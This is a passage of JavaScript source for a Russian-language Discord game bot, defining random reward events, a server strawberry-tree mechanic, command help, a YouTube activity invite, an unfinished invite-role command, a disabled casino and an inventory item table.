                  let cloverMessage = await msg.channel.awaitMessage(false, {preventDelete: true});
                  let reaction;
                  let i = 0;
                  while ((!reaction || !reaction.me) && i < 100){
                    reaction = cloverMessage.reactions.cache.get("☘️");
                    i++;
                    await delay(100);
                  }

                  if (reaction && reaction.me){
                    await delay(2000);
                    let author = cloverMessage.author;
                    author.data.void++;
                    cloverMessage.msg("Нестабилити!", {author: {name: author.username, iconURL: author.avatarURL()}, description: `**${author.username}!!!1!!!!111111!11111!!!!** Вот это да! Магияей клевера вы превратили небольшую горстку монет в камень нестабильности <a:void:768047066890895360>\nПо информации из математических источников это удавалось всего-лишь единицам из тысяч и вы теперь входите в их число!`, reactions: ["806176512159252512"]});
                    author.quest("cloverInstability");
                  }
                })();
              },
              textOutput: "С помощью вашей магии клевер стал сильнее. Если следующее сообщение в этом канале будет с коином, его автор получит нестабильность!"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins += scene.coins = random(10, 30),
              textOutput: "Разумеется, вы не могли упустить такого момента, и заработали {scene.coins} мелочи"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => TimeEvent.move(e => e.func == "cloverEnd" && e.args.includes(msg.guild.id), event => event.ms / 2),
              textOutput: "Похитили его ради своих нужд, клевер начал погибать, в попытках исправить свою ошибку вернули клевер на его место и дали немного воды... Действие эффекта уменьшено вдвое."
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => "cloverEffect" in msg.guild.data && level > 2
      },
      {
        id: "school",
        _weight: 5,
        description: "Тихим учебным днём...",
        variability: [
          [
            {
              action: async () => {
                user.berrys++;
                data.bot.berrysPrise += 3;
              },
              textOutput: "Труд-труд и ещё раз труд.. За усердную работу вы получили одну клубнику, а их цена на рынке поднялась на 3ед."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins -= 2,
              textOutput: "Школа.. Вспоминать о ней довольно грустно.\nСегодня ваше настроение было не очень весёлым"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                scene.random = random(1, 3);
                user.chestBonus = nonNaN(user.chestBonus) + scene.random;
              },
              textOutput: "Сундук знаний пополнился — Получено бонус сундука Х{scene.random}"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins -= 2,
              textOutput: "Вы с интересом изучали Астрономию."
            },
            false,
            false,
            false,
            {
              action: async () => user.coins += 782,
              textOutput: "Вы преподаете студентам курс высшей Астраномии.\nНеплохое занятие для того, кто хочет разрушить мир. Сегодня вы заработали 782 коина <:coin:637533074879414272>"
            }
          ],
        ],
        filterFunc: () => true
      },
      {
        id: "aBeautifulFox",
        _weight: 7,
        description: "Вы встретили прекрасного лиса",
        variability: [
          [
            {
              action: async () => user.chestBonus = nonNaN(user.chestBonus + 5),
              textOutput: "Он одарил Вас сокровищем: 5 бонусов сундука получено"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.chestBonus = nonNaN(user.chestBonus + 5),
              textOutput: "Он одарил Вас сокровищем: 5 бонусов сундука получено"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.chestBonus = nonNaN(user.chestBonus + 5),
              textOutput: "Он одарил Вас сокровищем: 5 бонусов сундука получено"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.chestBonus = nonNaN(user.chestBonus + 5),
              textOutput: "Он одарил Вас сокровищем: 5 бонусов сундука получено"
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => true
      },
      {
        id: "curseOfWealth",
        _weight: 40,
        description: "Наверное, это инфляция. Вы не в состоянии уследить за своим богатсвом.",
        variability: [
          [
            {
              action: async () => user.coins = Math.floor(user.coins * 0.98),
              textOutput: "Даже среди ваших верных друзей нашлись предатели, 2% золота было похищено."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins = Math.floor(user.coins * 0.98),
              textOutput: "Ваши богатсва обдирают прямо у вас на глазах. Вы слишком добры, чтобы их останавливать."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins = Math.floor(user.coins * 0.98),
              textOutput: "Вам удается вернуть лишь часть богатсв. Ещё 2% вы таки потеряли."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins = Math.floor(user.coins * 0.98),
              textOutput: "Вам ведь нет дела до каких-то монеток."
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => user.coins > 100_000_000
      },
      {
        id: "thingNotFound",
        _weight: 5 + nonNaN(Math.sqrt(user.voidRituals / 2) * 5),
        description: "Штука Вам больше не отвечает.",
        variability: [
          [
            {
              action: async () => true,
              textOutput: ["Вы ничего не можете с этим поделать", "Не взирая на Вашу силу, это так"].random()
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => true,
              textOutput: ["Штука просто штука.", "Так даже лучше"].random()
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => true,
              textOutput: ["Вы слишком сильны дня неё", "Ваша мощь куда больше силы штуки"].random()
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => true,
              textOutput: ["Что вам от неё нужно?!", "Штука была вашим другом"].random()
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => user.voidRituals > 100
      },
      {
        id: "letsMourn",
        _weight: 3,
        description: "О Вас ходят разные слухи",
        variability: [
          [
            {
              action: async () => true,
              textOutput: ["Говорят, вы никакущий фермер", "Поговаривают, что вы сами непонимаете для чего работаете"].random()
            },
            false,
            {
              action: async () => true,
              textOutput: ["Они хотят, чтобы вы рассказали побольше о своём деле", "Всех интересует вопрос: как..?"].random()
            },
            {
              action: async () => true,
              textOutput: ["Люди думают, вы продали душу ради урожая", "Якобы вы добились всего нечестным путём"].random()
            },
            false
          ],
          [
            {
              action: async () => true,
              textOutput: ["Говорят, вы абсолютно легкомысленны", "Поговаривают, что за свою жизнь вы побывали в самых разных абсурдных ситуациях"].random()
            },
            false,
            {
              action: async () => true,
              textOutput: ["Они хотят, чтобы вы рассказали как оно, быть удачливым", "Всех интересует вопрос: как..?"].random()
            },
            {
              action: async () => true,
              textOutput: ["Люди думают, что вы крадете их удачу", "Якобы вы добились всего нечестным путём"].random()
            },
            false
          ],
          [
            {
              action: async () => true,
              textOutput: ["Говорят, вы странный", "Поговаривают самые разные мифы"].random()
            },
            false,
            {
              action: async () => true,
              textOutput: ["Они хотят, чтобы вы научили их медитации", "Всех интересует вопрос: как..?"].random()
            },
            {
              action: async () => true,
              textOutput: ["Люди думают, что у вас вообще нет эмоций", "Якобы вы избавите этот мир от зла"].random()
            },
            false

          ],
          [
            {
              action: async () => true,
              textOutput: ["Говорят самые гадкие вещи про вас", "Поговаривают, что в вас нет ничего святого"].random()
            },
            false,
            {
              action: async () => true,
              textOutput: ["Они хотят той же мощи, что и у ваас", "Всех интересует вопрос: когда найдется тот, кто даст вам по башке?"].random()
            },
            {
              action: async () => true,
              textOutput: ["Люди думают, что вы их не убиваете только, чтобы творить более ужасные вещи", "Якобы вам никогда нельзя смотреть в глаза"].random()
            },
            false
          ]
        ],
        filterFunc: () => true
      },
      {
        id: "curse",
        _weight: 10,
        description: "Из-за того, что вы прокляты, к вам пристала старушка",
        variability: [
          [
            {
              action: async () => {
                user.coins += (level + 1) * 300;
              },
              textOutput: "— Не рискуйте так, молодой человек. Говорит она Вам. Несколько монет получено."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                user.coins += (level + 1) * 300;
              },
              textOutput: "— Рискуете то там, то сям, я вас понимаю. Возьмите это на всякий случай, зайдете лавку, а там приоберетете шубу от напастей. (Вы получили немного коинов)"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                user.coins += (level + 1) * 300;
              },
              textOutput: "— Угораздило же тебя пойти на такое, вот, возьми. Старушка в помощь дала вам немного монет"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                const userCurse = CurseManager.userCurse(msg.author);
                userCurse.incrementProgress(1);
                CurseManager.checkAvailable(msg.author);
              },
              textOutput: "— Я помогу тебе избавиться от твоего проклятия..."
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => user.curse
      }
    ].filter(scene => scene.filterFunc()).random({weights: true});


    scene.event = scene.variability[element]
      .filter((e, i) => i <= level && e !== false)
      .random();

    delete scene.variability;

    if (scene.fastFunc){
      scene.fastFunc();
    }

    await scene.event.action();
    let output = scene.event.textOutput.replace(/\{.+?\}/g, (action) => eval(action));

    let
      income = Math.round( [1, 1.7, 0.8, 0.2][element] * (level + 2.5) * (k + 5) ),
      phrase = ["Это птица? Это самолёт! Нет, это штука!", "Вдумайтесь..", "Ученье – свет, а неученье – штука.", "Игрушка!", "Случайности случайны.", "**ШТУКОВИНА**", "Используйте !штука я, чтобы поменять стихию", "Используйте !штука улучшить, чтобы открыть новые события"].random(),
      footerPhrase = ["кубик рубика", "сапог", "звёзду", "снеговика", "зайца", "большой город", "огненную обезьяну", "ананас", "кефир"].random();

    msg.guild.data.coins += income;
    msg.msg(phrase, {
      description: `Вы помогли серверу — он получил ${ending(income, "коин", "ов", "", "а")}${scene.id === "day" ? "" : "\nЗа это время также произошло интересное событие:"}`,
      color: embedColor,
      author: {iconURL: msg.author.avatarURL(), name: msg.author.username},
      fields: [{name: `Если коротко..`, value: `**${scene.description}**\n⠀`}, {name: `${emoji} ${level + 1} ур.`, value: output}],
      footer: {text: `Скажем так: эта вещь чем-то похожа на ${footerPhrase}..`}
    });
  }, {type: "other"}, "шутка штука aught аугт нечто"),

  commandinfo: new Command(async (msg, op) => {
    let __inServer = msg.channel.id === "753687864302108913";
    op.args = op.args.toLowerCase().replace(/[^a-zа-яёьъ]/g, "").trim();
    let cmd = commands[op.args];

    let typesList = {
      dev: "Команда в разработке или доступна только разработчику",
      delete: "Команда была удалена",
      guild: "Управление сервером",
      user: "Пользователи",
      bot: "Бот",
      other: "Другое"
    };

    if (!cmd){
      let helpMessage = await msg.msg("Не удалось найти команду", {description: `Не существует вызова \`!${op.args}\`\nВоспользуйтесь командой !хелп или нажмите реакцию ниже для получения списка команд.\nВы можете предложить новое слово для вызова одной из существующих команд.`});
      //** Реакция-помощник
      let react = await helpMessage.awaitReact({user: msg.author, type: "all"}, "❓");
      if (!react){
        return;
      }

      await commands.help.code(msg);
      /**/
      return;
    }

    let originalName = Object.keys(commands)[cmd.id - 1];
    let allNamesList = Object.entries(commands).filter(([k, v]) => v.id === cmd.id).map(([k, v]) => k).filter(e => e !== originalName);
    let guideDescription;


    guideDescription = fs.readFileSync("main/descriptions-commands.txt", "utf-8").split("---")[cmd.id - 1] || "Описание для этой команды пока отсуствует...";
    let gifURL = match(guideDescription, /(?<=\n)http\S+/);
    if (gifURL){
      guideDescription = guideDescription.replace(gifURL, "").trim();
    }

    let used = data.bot.commandsUsed[cmd.id] || 0;
    let percentUsed = +(used / Object.values(data.bot.commandsUsed).reduce((acc, e) => acc + e, 0) * 100).toFixed(1) + "%";




    let embed = {
      description: guideDescription.trim() + (__inServer ? `\nДругие названия:\n${allNamesList.map(e => `!${e}`).join(" ")}` : ""),
      color: __inServer ? null : "1f2022",
      image: gifURL || (__inServer ? null : "https://media.discordapp.net/attachments/629546680840093696/963343808886607922/disboard.jpg"),
      fields: __inServer ? null : [{name: "Другие способы вызова:", value: Discord.Util.escapeMarkdown( allNamesList.map(e => `!${e}`).join(" ") )}, {name: "Категория:", value: typesList[cmd.type]}, {name: "Необходимые права", value: cmd.Permissions ? new Discord.Permissions(cmd.Permissions).toArray().map(e => Command.permissions[e]) : "Нет"}, {name: "Количество использований", value: `${used} (${percentUsed})`}],
      footer: __inServer ? null : {text: `Уникальный идентификатор команды: ${ cmd.id }`}
    }
    let message = await msg.msg(`— ${originalName.toUpperCase()}`, embed);
    return message;
  }, {args: true, cooldown: 5, delete: true, type: "bot"}, "command команда"),

  seed: new Command(async (msg, op) => {
    const thumbnailArray = [null, "https://cdn.discordapp.com/attachments/629546680840093696/875367772916445204/t1.png", "https://cdn.discordapp.com/attachments/629546680840093696/875367713411858492/t2.png", "https://cdn.discordapp.com/attachments/629546680840093696/875367267318247444/t3.png", "https://cdn.discordapp.com/attachments/629546680840093696/875366344642662510/t4_digital_art_x4.png", "https://cdn.discordapp.com/attachments/629546680840093696/875366096952246312/t9.png"];

    let server = msg.guild.data;
    let level = server.treeLevel || 0;
    const COSTS_TABLE = [1, 1, 1, 3, 2, 2, 2, 4, 2, 2, 2, 5, 3, 3, 3, 7, 4, 4, 4, 10];
    let costsUp = COSTS_TABLE[level];


    const berrysStarts = Math.floor( server.berrys ) || 0;
    const getSpeedGrowth = (level) => [0, 1.2, 1.8, 2.5, 5, 7.5, 10, 12, 15.6, 21, 24, 42, 54, 66, 84, 108, 144, 252, 360, 450, 792, 1008][level];

    let timePassed;

    let fields = [];
    const fillEmbed = () => {
      const speedGrowth = getSpeedGrowth(level);
      server.berrys = Math.min( nonNaN(server.berrys) + (timePassed / 86400000) * speedGrowth, speedGrowth * 360 );

      let grow = speedGrowth > 100 ? {type: "минуту", count: speedGrowth / 1440} : speedGrowth > 10 ? {type: "час", count: speedGrowth / 24} : {type: "день", count: speedGrowth};
      fields.push({name: "Урожай", value: `Клубники выростает ${grow.count} в ${grow.type}\nГотово для сбора: ${Math.floor(server.berrys)}\nСледущая дозреет через: ${timestampToDate((1 - server.berrys % 1) * 86400000 / speedGrowth)} <:berry:756114492055617558>`});

      let entrySeeds = server.treeSeedEntry || 0;
      fields.push({name: "Дерево", value: `Уровень деревца ${ level } ${level === 20 ? "(Максимальный)" : `\nДо повышения нужно ${costsUp - entrySeeds > 5 ? costsUp - entrySeeds : ["ноль", "одно", "два", "три", "четыре", "пять"][costsUp - entrySeeds]} ${ending(costsUp - entrySeeds, "сем", "ян", "ечко", "ечка", {slice: true})}` }`});

      let messagesNeed = (  [0, 70, 120, 180, 255, 370, 490, 610, 730, 930, 1270, 1500, 1720, 2200, 2700, 3200, 3700, 4500, 5400, 7400, 12000][level] + (msg.guild.memberCount * 3) + ((server.day_average || 0) / 5)  ) * ("treeMisstakes" in server ? 1 - 0.1 * server.treeMisstakes : 1);
      messagesNeed = Math.floor(messagesNeed / 3);

      let statusName = server.treeMisstakes ?
        messagesNeed <= server.day_msg ? "Дерево восстанавливается" : "Следите, чтобы дерево не засохло" :
        messagesNeed <= server.day_msg ? "Дерево счастливо" : "Дерево радуется";

      let statusValue = messagesNeed <= server.day_msg ? "Необходимое количество сообщений уже собрано!" :
      `Сообщений собрано: ${server.day_msg}/${messagesNeed} ${  server.treeMisstakes ? `\nРискует завянуть через ${+(4 - server.treeMisstakes).toFixed(1)}д` : ""}`;

      fields.push({name: `💧 ${statusName}`, value: statusValue});
    }

    if (level !== 0){
      timePassed = (getTime() - server.treeEntryTimestamp) || 0;
      server.treeEntryTimestamp = getTime();
      fillEmbed();
    }
    else {
      fields.push({name: "Общая инфомация", value: "Ему ещё предстоит вырасти, будучи семечком дерево не может давать плоды.\nОбязательно посадите семя, если оно у вас есть.\n\n❓ Выполняя каждый 50-й квест вы получаете по две штуки"});
      timePassed = (getTime() - server.treeEntryTimestamp) || 0;
    }

    let embed = {
      thumbnail: thumbnailArray[ Math.ceil(level / 4) ],
      description: `Это растение способно принести океан клубники за короткий срок. Для этого заботьтесь о нём: общайтесь на сервере, поддерживайте ламповую атмосферу, проводить время весело и следите, чтобы дерево не засохло.`,
      fields: fields,
      footer: {text: "Ваши сообщения используются для полива растений и полностью заменяют собой воду", iconURL: "https://emojipedia-us.s3.amazonaws.com/source/skype/289/sweat-droplets_1f4a6.png"}
    };

    let message = await msg.msg("Живое, клубничное дерево", embed);



    if (level !== 20){
      await message.react("🌱");
    }

    if (server.berrys >= 1){
      await message.react("756114492055617558");
    }

    let collector = message.createReactionCollector((r, u) => u.id !== client.user.id && ( r.emoji.name === "🌱" || r.emoji.id === "756114492055617558" ), {time: 180000});
    collector.on("collect", async (r, memb) => {
      let react = r.emoji.id || r.emoji.name;
      let user = memb.data;

      if (react === "🌱"){

        if ( level === 20 ){
          msg.msg("Ещё больше?", {description: `Не нужно, дерево уже максимального уровня!`, author: {name: memb.username, iconURL: memb.avatarURL()}, delete: 7000});
          message.reactions.resolve("🌱").remove();
          return;
        }


        if (!user.seed){
          msg.msg("У вас нет Семян", {description: `Где их достать? Выполняйте ежедневные квесты, каждый 50-й выполненый квест будет вознаграждать вас двумя семечками.`, author: {name: memb.username, iconURL: memb.avatarURL()}, delete: 7000});
          return;
        }


        server.treeSeedEntry = nonNaN(server.treeSeedEntry) + 1;
        user.seed--;
        msg.msg(`Спасибо за семечко, ${memb.username}`, {description: `🌱 `, delete: 7000});

        // Если уровень дерева увеличился
        if (server.treeSeedEntry >= costsUp){
          server.treeSeedEntry = 0;
          level = server.treeLevel = nonNaN(server.treeLevel) + 1;
          costsUp = COSTS_TABLE[level];
          server.berrys = Math.round(1.5 ** (level + 3) + server.berrys);
          server.berrys = nonNaN(server.berrys) + getSpeedGrowth(level) * 5;

          await message.react("756114492055617558");
          embed.thumbnail = thumbnailArray[ Math.ceil(level / 4) ];

          msg.msg("Дерево немного подросло", {description: `После очередного семечка 🌱, дерево стало больше и достигло уровня ${ level }!`});
          delete server.treeMisstakes;
        }


      }


      // Berry take
      if (react === "756114492055617558"){
        if (user.CD_54 > getTime()){
          msg.msg("Перезарядка...", {description: `Вы сможете собрать клубнику только через **${timestampToDate( user.CD_54 - getTime() )}**`, footer: {text: "Перезарядка уменьшается по мере роста дерева"}, author: {name: memb.username, iconURL: memb.avatarURL()}, delete: 7000, color: "ff0000"});
          return;
        }

        if (server.berrys < 1){
          msg.msg("Упс..!", {description: "На дереве закончилась клубника. Возможно, кто-то успел забрать клубнику раньше вас.. Ждите, пока дозреет следущая, не упустите её!", author: {name: memb.username, iconURL: memb.avatarURL()}, delete: 7000, color: "ff0000"});
          return;
        }

        const isBerryMany = server.berrys > getSpeedGrowth(level) * 3;

        const farmerBonus = nonNaN(user.voidTreeFarm);
        let berrys = isBerryMany ?
          random(1 + farmerBonus, 3 + farmerBonus * 2, {round: false}) :
          1 + farmerBonus;

        berrys = Math.min(Math.floor(berrys), Math.floor(server.berrys));


        user.berrys += berrys;
        server.berrys -= berrys;

        data.bot.berrysPrise += berrys * 0.2;
        msg.msg("Вы успешно собрали клубнику", {author: {name: memb.username, iconURL: memb.avatarURL()}, description: `${berrys > 5 ? berrys : ["Ноль", "Одна", "Две", "Три", "Четыре", "Пять"][berrys]} ${ending(berrys, "ягод", "", "а", "ы", {slice: true})} ${ending(berrys, "попа", "дают", "ла", "ли", {slice: true})} в ваш карман <:berry:756114492055617558>`, delete: 9000});
        user.CD_54 = getTime() + Math.max( 86400000 / getSpeedGrowth(level) * (1 + level), 7200000 );

        const becomeCoinMessage = async (user) => {
          const collector = new Util.CustomCollector({target: client, event: "message", filter: (message) => message.author.id === user.id, time: 500_000});
          collector.setCallback((message) => {
            collector.end();
            getCoinsFromMessage(user, message);
          });
        }
        if (!random(0, 5)){
          becomeCoinMessage(user);
        }
      }

      fields.splice(0, fields.length);
      fillEmbed();

      // Показывает сколько клубники собрали пользователи
      if (  berrysStarts - Math.floor(server.berrys) > 0 ){
        let berrysTaken = { name: "Клубники собрали участники", value: `${ending(  berrysStarts - Math.floor(server.berrys), "штук", "", "а", "и"  )};` };
        fields.splice(-1, 0, berrysTaken);
      }

      embed.edit = true;
      await message.msg("Живое, клубничное дерево", embed);
    });

    collector.on("end", message.reactions.removeAll);
  }, {dm: true, type: "other"}, "tree livetree семечко berrystree дерево клубничноедерево живоедерево"),

  youtube: new Command(async (msg, op) => {
    if (msg.member.voice.channel){

      const request = {
        method: 'POST',
        body: JSON.stringify({
          max_age: 86400,
          max_uses: 0,
          target_application_id: "880218394199220334",
          target_type: 2,
          temporary: false,
          validate: null
        }),
        headers: {
          'Authorization': `Bot ${client.token}`,
          'Content-Type': 'application/json'
        }
      }

      let res = await fetch(`https://discord.com/api/v8/channels/${msg.member.voice.channel.id}/invites`, request);
      let invite = await res.json();

      if (invite.code === 50013){
        msg.msg("У бота не хватает прав", {description: `Необходимо право "Создавать приглашения"`, delete: 9000, color: "ff0000"});
        return;
      }

      msg.msg("Активити сгенерированно", {description: `[Кликните](https://discord.com/invite/${invite.code}), чтобы подключится к активити Совместный Ютуб\nЕсли вы используете мобильную версию дискорда, эта возможность пока-ещё недоступна`});
      return;
    }
    msg.msg("Необходимо находится в голосовом канале", {color: "ff0000", delete: 7000});
  }, {dm: true, type: "other", myPermissions: 1}, "ютуб ютубвместе youtubetogether"),

  invites: new Command(async (msg, op) => {
    if (op.memb){
      const member = msg.guild.member(op.memb);

      const getGuildMemberInvites = async (member) => {
        const guild = member.guild;
        const invites = await guild.fetchInvites();
        
        if (!invites){
          return null;
        }

        return invites.filter(({inviter}) => inviter === member.user);
      }

      const invitesCount = member.user.data.invites || 0;

      const byInvitesCountContent = `За время пребывания бота на сервере, упомянутый пользователь пригласил ${ ending(invitesCount, "человек", "", "", "а") }.`;

      const guildInvites = await getGuildMemberInvites(member);
      const byGuildDataContent = guildInvites && guildInvites.size ? `${ member.displayName } создал(-a) ${ ending(guildInvites.size, "", "ссыллок-приглашений", "ссылку-приглашение", "ссылки-приглашения") } — посетило ${ ending(guildInvites.reduce((acc, invite) => (invite.uses || 0) + acc, 0), "персон", "", "а", "ы") } <:treeJoke:827441080492490752>` : "";

      const description = `${ byInvitesCountContent }\n${ byGuildDataContent }`;
      const footer = {iconURL: member.user.avatarURL(), text: member.username};

      msg.msg("", {footer, description});
      return;
    }

    let answer = await accept("invites_command", {message: "Присвойте ссылкам их уникальную роль", description: "Как это работает?\nВы как администратор создаете роль, назовём её \"Фунтик\" и решаете, какие пользователи будут получать её при входе в систему. Есть несколько типов условий:\n\n1) В режиме постоянной ссылки: Всем зашедшим через эту ссылку будет выдана роль Фунтик.\n2) Выдаваемая роль будет определяться наличием у пригласившего другой роли, например, \"Хороший друг\". Любая ссылка созданная Хорошим другом предвкушает Фунтика \n3) По умолчанию — если не отработал ни один вариант выше.\n\nЗачем это?\nВы можете определить права участника в зависимости от того, кто его пригласил; ведение статистики, распределение людей которые пришли с партнёрки и по знакомству, тому подобное. Это то, что вы можете сделать с помощью этой команды"}, msg.channel, msg.author.data);
    if (!answer) return;

    const numericReactions = ["1️⃣", "2️⃣", "3️⃣"];

    const rulesList = msg.guild.data.inviteRules ||= [];
    const getListDescription = (list) => {
      if (list.length === 0){
        return "Отсуствуют";
      }

      const main = list
        .map(({type, roleId}) => `${ numericReactions.at(type) } <@&${ roleId }>`)
        .join("\n");

      return `🔧\n${ main }`;
    }

    let embed = {
      description: `Пожалуйста, выберите тип условия:\n\n1) Роль будут получать те, кто перешёл по конкретной ссылке.\n2) Выдавать роль тем, кого пригласил участник сервера имеющий далее указанную роль (Пригласил — участник создал ссылку-приглашение через которую пользователь попал на сервер) \n3) Будет выдана всем, кто не получил никакой роли с предыдущих пунктов (по умолчанию)\n\nТекущие настройки: ${ getListDescription(rulesList) }`,
      footer: {
        text: "Орифлейм. Стоп-контроль"
      }
    }
    let message = await msg.msg("Присвойте ссылкам их уникальную роль", embed);
    embed.edit = true;
    
    let reactions = [...numericReactions, rulesList.length ? "🔧" : null];
    let react = await message.awaitReact({ user: msg.author, type: "all" }, ...reactions);

    if (!react){
      message.delete();
      return;
    }

    // TODO: 
    if (reaction === "🔧"){

    }
      
    // TODO: 
    if (numberReactions.include(reaction)){
      const type = numberReactions.indexOf(reaction);
      embed.description = `**Тип:** ${ ["конкретная ссылка", "наличие роли у пригласившего", "выдача по умолчанию"][type] };\n\nОтлично, `;
    }
    
  }, {dm: true, type: "guild", permissions: 8}, "приглашения"),

  casino: new Command(async (msg, op) => {
    msg.msg("Казино закрыто", {description: "Казино закрыто. Боюсь что оно больше не откроется.\nЭтого не могло не случится, извините.\n\n — Прощайте. ©️Мэр-Миллиардер Букашка", delete: 20000});
    return;

    let bet = op.args.match(/\d+|\+/);

    if (bet === null){
      msg.msg("Укажите Ставку в числовом виде!", {color: "ff0000", delete: 3000});
      return;
    }
    bet = bet[0];

    if (bet === "+")
      bet = op.user.coins;

    bet = Math.max(0, Math.floor(bet));

    if (op.user.coins < bet){
      msg.msg("Недостаточно коинов", {color: "ff0000", delete: 3000});
      return;
    }

    const diceRoll = random(100);
    const options = {
      title: "Лесовитое казино",
      author: { name: msg.author.username, iconURL: msg.author.avatarURL() },
      delete: 20000,
      footer: {text: `Ставка: ${ bet }`}
    }
    const isWon = diceRoll % 2;
    options.description = `
**${ isWon ? "Вы выиграли." : "Проиграли" }**
**Кидаем кубик.. выпадает:** \`${ diceRoll }\`; ${ isWon ? "🦝" : "❌" }

${ isWon ? `\\*Вам достается куш — ${ ending(bet * 2, "коин", "ов", "", "а") } <:coin:637533074879414272>\\*` : "Чтобы выиграть дожно выпасть число, которое не делится на 2" }
    `;

    op.user.coins -= (-1) ** isWon * bet;
    msg.msg(options.title, options);
  }, {type: "other", delete: true, dev: true}, "казино bet ставка"),

  bag: new Command(async (msg, op) => {

    if (op.memb){
      msg.msg("Вы не можете просматривать содержимое сумки у других пользователей", {color: "ff0000", delete: 15_000});
      return;
    }

    const user = op.user;


    class ItemTaker {
      display(...args){
        return this.ending(...args);
      }

      // Default getter
      getter({target}){
        return target[this.key];
      }
      setter({target, count}){
        return target[this.key] = count;
      };

      getLimit(){
        return this.limit || null;
      }
    }

    const ITEMS = [
      {
        key: "coins",
        names: ["коина", "коины", "коин", "коинов", "coins", "coin", "c", "к"],
        ending: (count) => `<:coin:637533074879414272> ${ ending(count, "Коин", "ов", "", "а") }`
      },
      {
        key: "exp",
        names: ["опыта", "опыт", "опытов", "exp", "experience"],
        ending: (count) => `<:crys2:763767958559391795> ${ ending(count, "Опыт", "а", "", "а") }`
      },
      {
        key: "chestBonus",
        names: ["бонусов", "бонус", "бонуса", "сундука", "сундуков", "сундук", "бонусов сундука", "chestbonus"],
        ending: (count) => `<a:chest:805405279326961684> ${ ending(count, "Бонус", "ов", "", "а") } сундука`
      },
      {
        key: "void",
        names: ["нестабильности", "нестабильность", "void", "камень", "камней", "камня"],
        ending: (count) => `<a:void:768047066890895360> ${ ending(count, "Кам", "ней", "ень", "ня") } нестабильности`
      },
      {
        key: "berrys",
        names: ["клубник", "клубники", "клубника", "клубниу", "ягоды", "ягод", "ягода", "berry", "berrys"],
        ending: (count) => `<:berry:756114492055617558> ${ ending(count, "Клубник", "", "а", "и") }`
      },
      {
        key: "chilli",
        names: ["перец", "перцев", "перца", "chilli"],
        ending: (count) => `🌶️ ${ ending(count, "Пер", "цев", "ец", "ца") }`
      },
      {
        key: "monster",
        names: ["монстр", "монстров", "монстра", "monster"],
        ending: (count) => `🐲 ${ ending(count, "Монстр", "ов", "", "а") }`
      },
      {
        key: "thiefGloves",
        names: ["перчатки", "перчатку", "перчатка", "перчаток", "glove", "gloves"],
        ending: () => `🧤 ${ ending(count, "Перчат", "ки", "у", "ки") }`,
        display: (count) => `🧤 Перчатки ${ count }шт.`,
        getter: ({target}) => {
          const isUser = "id" in target;

          if (isUser){
            const thiefGloves = (target.thiefGloves || "0|0")
              .split("|");

            const [gloves, ...rest] = thiefGloves;
            return +gloves;
          }

          if (!isUser){
            return target.thiefGloves;
          }
        },
        setter: ({target, count}) => {
          const isUser = "id" in target;

          if (isUser){
            const thiefGloves = (target.thiefGloves || "0|0")
              .split("|");

            thiefGloves[0] = count;
            return target.thiefGloves = thiefGloves.join("|");
          }

          if (!isUser){
            return target.thiefGloves = count;
          }
        }
      },
      {
        key: "keys",
        names: ["ключ", "ключей", "ключа", "ключи", "key"],
        ending: (count) => `🔩 ${ ending(count, "Ключ", "ей", "", "а") }`
      },
      {
        key: "seed",
        names: ["семечко", "семечек", "семян", "семечка", "семячек", "seed"],
        ending: (count) => `🌱 ${ ending(count, "Сем", "ян", "ечко", "ечка") }`
      },
      {
        key: "iq",
        names: ["iq", "icq", "iqbanana", "айкью"],
        ending: (count) => `<a:iq:768047041053196319> ${ count } IQ`
      },
      {
        key: "coinsPerMessage",
        names: ["коинов за сообщение", "награда коин-сообщений", "coinsPerMessage"],
        ending: (count) => `✨ ${ ending(count, "Коин", "ов", "", "а") } за сообщение`
      },
      {
        key: "voidCooldown",
        names: ["уменьшений кулдауна", "уменьшение кулдауна", "уменьшения кулдауна", "voidcooldown"],
        limit: 20,
        ending: (count) => `🌀 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `🌀 Бонус "Уменьшение кулдауна" ${ count }/20`
      },
      {
        key: "voidPrise",
        names: ["скидок на котёл", "скидок на котел", "voidprise"],
        limit: 5,
        ending: (count) => `⚜️ ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `⚜️ Бонус "Скидок на котёл" ${ count }/5`
      },
      {
        key: "voidDouble",
        names: ["нестабилити", "voiddouble"],
        limit: 1,
        ending: (count) => `🃏 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `🃏 Бонус "Нестабилити" ${ count }/1`
      },
      {
        key: "voidQuests",
        names: ["усиление квестов", "усиление квеста", "voidquests"],
        limit: 5,
        ending: (count) => `🔱 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `🔱 Бонус "Усиление квестов" ${ count }/5`
      },
      {
        key: "voidCoins",
        names: ["шанс коина", "шанс коинов", "voidcoins"],
        limit: 7,
        ending: (count) => `♦️ ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `♦️ Бонус "Шанс коина" ${ count }/7`
      },
      {
        key: "voidMonster",
        names: ["монстр-защитник", "монстр защитник", "voidmonster"],
        limit: 1,
